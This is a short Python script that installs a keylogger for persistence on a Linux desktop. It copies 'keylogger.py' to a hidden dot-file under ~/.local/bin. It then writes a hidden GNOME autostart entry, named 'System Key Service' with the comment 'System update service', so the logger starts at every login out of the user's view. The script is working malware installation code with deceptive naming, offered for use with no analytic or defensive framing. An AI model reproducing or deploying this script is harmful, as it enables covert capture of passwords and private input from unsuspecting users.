import os
import shutil

HOME = os.path.expanduser('~')
hidden_dir = os.path.join(HOME, '.local', 'bin')
hidden_script = os.path.join(hidden_dir, '.syskey.py')
autostart_dir = os.path.join(HOME, '.config', 'autostart')
desktop_file = os.path.join(autostart_dir, 'syskey.desktop')

# Ensure directories exist
os.makedirs(hidden_dir, exist_ok=True)
os.makedirs(autostart_dir, exist_ok=True)

# Copy keylogger.py to hidden location
shutil.copyfile('keylogger.py', hidden_script)

# Create .desktop autostart entry
desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {hidden_script}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=System Key Service
Comment=System update service
"""

with open(desktop_file, 'w') as f:
    f.write(desktop_entry)

print("Keylogger installed to run on boot (hidden).") 